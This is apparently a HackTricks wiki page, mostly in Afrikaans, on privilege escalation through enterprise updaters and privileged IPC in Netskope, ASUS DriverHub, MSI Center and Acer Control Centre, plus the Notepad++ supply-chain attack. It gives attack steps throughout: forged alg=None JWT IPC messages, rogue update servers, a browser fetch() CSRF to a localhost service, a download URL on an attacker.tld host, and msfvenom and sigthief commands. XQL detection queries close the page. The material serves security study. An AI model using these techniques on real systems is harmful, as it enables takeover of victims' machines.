# Misbruik van Enterprise Auto-Updaters en Geprivilegieerde IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy generaliseer 'n klas Windows local privilege escalation chains wat gevind word in ondernemings-endpoint agents en updaters wat 'n lae-wrywing IPC-oppervlakte en 'n geprivilegieerde update-vloei openbaar. 'n Reprensentatiewe voorbeeld is Netskope Client vir Windows < R129 (CVE-2025-0309), waar 'n laag-geprivilegieerde gebruiker inskrywing kan afdwing na 'n aanvaller-beheerde bediener en dan 'n kwaadwillige MSI lewer wat die SYSTEM service installeer.

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik 'n geprivilegieerde diens se localhost IPC om her-registrasie of herkonfigurasie na 'n aanvaller-beheerde bediener af te dwing.
- Implementeer die verskaffer se update-endpoints, lewer 'n rogue Trusted Root CA, en wys die updater na 'n kwaadwillige, “signed” pakket.
- Ontwyk swak signer checks (CN allow-lists), opsionele digest flags, en lakse MSI-eienskappe.
- As IPC “encrypted” is, lei die key/IV af uit wêreld-leesbare masjien-identifiseerders wat in die register gestoor is.
- As die diens oproepers beperk op grond van image path/process name, injecteer in 'n allow-listed proses of spawn een gesuspendeer en bootstrap jou DLL via 'n minimale thread-context patch.

---
## 1) Afdwing van inskrywing na 'n aanvaller-bediener via localhost IPC

Baie agente lewer 'n user-mode UI process wat met 'n SYSTEM service oor localhost TCP kommunikeer deur JSON te gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Eksploit-vloei:
1) Skryf 'n JWT enrollment token waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag aanroep met jou JWT en tenant naam:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die service begin jou rogue server te kontak vir enrollment/config, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Aantekeninge:
- Indien caller verification path/name-based is, stuur die request vanaf 'n allow-listed vendor binary (sien §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sodra die client met jou server praat, implementeer die verwagte endpoints en stuur dit na 'n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Stuur 'n JSON config terug met 'n baie kort updater interval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige versleutelde opdragte stuur vanaf 'n gewone gebruiker. Algemene wenk: as 'n agent skielik sy IPC “enkripteer”, soek na device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige dienste probeer die peer te autentiseer deur die TCP-verbinding se PID op te los en die image path/name te vergelyk met allow-listed vendor binaries geleë onder Program Files (bv., stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL injection in 'n allow-listed proses (bv., nsdiag.exe) en proxy IPC van binne dit.
- Spawn 'n allow-listed binary gesuspendeer en bootstrap jou proxy DLL sonder CreateRemoteThread (see §5) om driver-enforced tamper rules te bevredig.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) CreateProcess van 'n vendor binary met CREATE_SUSPENDED.
2) Verkry handvatsels wat jy nog toegelaat is om te kry: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en 'n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by 'n bekende RIP plaas).
3) Oorskryf ntdll!NtContinue (of ander vroeë, gewaarborgde-gelaaide thunk) met 'n klein stub wat LoadLibraryW op jou DLL-pad aanroep, en dan terug spring.
4) ResumeThread om jou stub in-proses te aktiveer, wat jou DLL laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds-beskermde proses gebruik het nie (jy het dit geskep), word die driver se beleid nagekom.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder getoon word, slaag wanneer die Origin header tot die betroubare waarde vervalst word:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Onveilige code-signing verifikasie & sertifikaat-kloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai ewekansige uitvoerbare lêers af wat in die JSON-lichaam gedefinieer word en kas dit in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL-verifikasie hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Na aflaai kontroleer ADU.exe net dat die PE 'n handtekening bevat en dat die Subject-string ooreenstem met ASUS voordat dit uitgevoer word – geen `WinVerifyTrust`, geen kettingverifikasie nie.

Om die vloei te misbruik:
1) Skep 'n payload (bv., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloneer ASUS se signer daarin (bv., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op 'n `.asus.com` nabootsing-domein en trigger UpdateApp via die browser CSRF hierbo.

Aangesien beide die Origin- en URL-filters substring-gebaseer is en die signer-kontrole net stringe vergelyk, trek DriverHub die attacker binary en voer dit uit onder sy verhoogde konteks.

---
## 1) TOCTOU binne updater kopieer/uitvoer-paaie (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens openbaar 'n TCP-protokol waar elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Die kernkomponent (Component ID `0f 27 00 00`) lewer `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Kopieer die verskafte uitvoerbare na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (sertifikaat-subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep 'n geskeduleerde taak wat die temp-lêer as SYSTEM uitvoer met attacker-beheerde argumente.

Die gekopieerde lêer word nie gesluit tussen verifikasie en `ExecuteTask()` nie. 'n attacker kan:
- Stuur Frame A wat wys na 'n legitieme MSI-ondertekende binêre (waarborg dat die handtekeningkontrole slaag en die taak in die ry geplaas word).
- Wed dit met herhaalde Frame B-boodskappe wat na 'n kwaadwillige payload wys, en oorskryf `MSI Center SDK.exe` net nadat verifikasie voltooi is.

Wanneer die skeduleerder afgaan, voer dit die oorskryfde payload as SYSTEM uit ondanks die validering van die oorspronklike lêer. Betroubare uitbuiting gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU-venster gewen word.

---
## 2) Misbruik van pasgemaakte SYSTEM-vlak IPC & impersonasie (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang 'n Component ID wat gestoor word onder `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Die eerste 4 bytes van 'n raam selekteer daardie komponent, wat attackers toelaat om opdragte na arbitrêre modules te roeteer.
- Plugins kan hul eie taak-uitvoerders definieer. `Support\API_Support.dll` openbaar `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` en roep direk `API_Support.EX_Task::ExecuteTask()` aan met geen handtekeningverifikasie nie – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` wys en deterministies SYSTEM-uitvoering kry.
- Loopback-sniffing met Wireshark of instrumentering van die .NET-binaries in dnSpy openbaar vinnig die Component ↔ command-kartering; pasgemaakte Go/Python-kliente kan dan rame herhaal.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) openbaar `\\.\pipe\treadstone_service_LightMode`, en sy diskresionêre ACL laat afgeleë kliënte toe (bv., `\\TARGET\pipe\treadstone_service_LightMode`). Die stuur van command ID `7` met 'n lêerpad roep die diens se proses-skep-roetine aan.
- Die kliëntbiblioteek serialiseer 'n magiese terminator-byte (113) saam met args. Dynamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringwenke) toon dat die native handler hierdie waarde na 'n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat `CreateProcessAsUser` aangeroep word.
- Die vervanging van 113 (`0x71`) met 114 (`0x72`) val in die generiese tak wat die volledige SYSTEM-token behou en 'n hoë-integriteit SID (`S-1-16-12288`) stel. Die geskapen binêre hardloop dus as onbeperkte SYSTEM, beide plaaslik en oor masjiene.
- Kombineer dit met die ontbloot installer-flag (`Setup.exe -nocheck`) om ACC selfs op lab VMs op te rig en die pipe te oefen sonder vendor-hardware.

Hierdie IPC-bugs beklemtoon hoekom localhost-dienste wedersydse verifikasie moet afdwing (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en hoekom elke module se “run arbitrary binary” helper dieselfde signer-verifikasies moet deel.

---
## Afstandige voorsieningsketting-kaping deur swak updater-verifikasie (WinGUp / Notepad++)

Oudere WinGUp-gebaseerde Notepad++ updaters het nie die opdaterings-egtheid ten volle geverifieer nie. Wanneer attackers die hosting-verskaffer vir die opdateringsbediener gekompromitteer het, kon hulle die XML-manifes manipuleer en slegs gekose kliënte na attacker-URL's herlei. Omdat die kliënt enige HTTPS-antwoord aanvaar het sonder om beide 'n vertroude sertifikaatketting en 'n geldige PE-handtekening af te dwing, het slagoffers 'n getrojaneerde NSIS `update.exe` afgelaai en uitgevoer.

Operasionele vloei (geen plaaslike uitbuiting vereis nie):
1. **Infrastructure interception**: kompromiteer CDN/hosting en antwoord op opdateringskontroles met attacker-metadata wat na 'n kwaadwillige aflaai-URL wys.
2. **Trojanized NSIS**: die installateur haal 'n payload af/voer dit uit en misbruik twee uitvoeringskettings:
- **Bring-your-own signed binary + sideload**: bundel die ondertekende Bitdefender `BluetoothService.exe` en plaas 'n kwaadwillige `log.dll` in sy soekpad. Wanneer die ondertekende binêre loop, Windows sideloads `log.dll`, wat die Chrysalis backdoor ontsleutel en reflectief laai (Warbird-beskerm + API hashing om statiese opsporing te bemoeilik).
- **Scripted shellcode injection**: NSIS voer 'n saamgestelde Lua-skrip uit wat Win32 API's (bv., `EnumWindowStationsW`) gebruik om shellcode te injecteer en die Cobalt Strike Beacon te laai.

Verharding/deteksie wenke vir enige auto-updater:
- Dwing **sertifikaat + handtekeningverifikasie** af vir die afgelaaide installateur (pin vendor signer, verwerp wanpassende CN/ketting) en teken die opdateringsmanifes self (bv., XMLDSig). Blokkeer manifes-beheerde herleiings tensy gevalideer.
- Beskou **BYO signed binary sideloading** as 'n post-aflaai-detekseringspunt: waarsku wanneer 'n ondertekende vendor EXE 'n DLL-naam laai van buite sy kanoniese installasiepad (bv., Bitdefender laai `log.dll` vanaf Temp/Downloads) en wanneer 'n updater installateurs in temp plaas/uitvoer wat nie deur die vendor onderteken is.
- Monitor **malware-specific artifacts** wat in hierdie ketting waargeneem is (nuttig as generiese punte): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe` skrywings na `%TEMP%`, en Lua-gedrewe shellcode-injectie fases.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat 'n installer begin wat nie Notepad++ is nie</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone generaliseer na enige updater wat unsigned manifests aanvaar of versuim om installer signers te pin—network hijack + malicious installer + BYO-signed sideloading lei tot remote code execution onder die skyn van “trusted” updates.

---
## Verwysings
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
